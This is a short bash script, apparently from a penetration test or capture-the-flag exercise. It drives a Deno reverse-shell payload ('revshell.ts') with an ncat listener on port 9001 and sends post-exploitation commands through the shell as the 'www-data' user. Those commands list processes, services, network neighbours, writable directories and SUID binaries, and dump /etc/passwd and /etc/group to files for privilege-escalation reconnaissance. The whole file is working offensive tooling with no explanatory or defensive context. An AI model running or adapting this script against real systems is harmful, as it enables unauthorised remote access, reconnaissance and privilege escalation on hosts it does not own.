#!/usr/bin/env bash

set -e

function triggerRevshell() {
    deno run --allow-net --unstable revshell.ts
}

function listenRevshell() {
    ncat -lp 9001
}

DIR=data
INIT_COMMAND=""

function commandToFile() {
    local command="$1"
    local file="$2"
    mkdir -p $DIR
    echo "$INIT_COMMAND $command" | listenRevshell >"$DIR/$file" &
    triggerRevshell
    wait
}

DIR="www-data"
commandToFile "ps auxw" processes.txt
commandToFile "systemctl --no-pager --full status" services.txt
commandToFile "ip a ; ip n" network.txt
commandToFile "find / -writable -type d -ls" writeableDirs.txt
commandToFile "find / -type f -perm -04000 -ls" suid.txt
commandToFile "cat /etc/passwd ; cat /etc/group" users.txt
commandToFile "hostname ; uname -a" host.txt
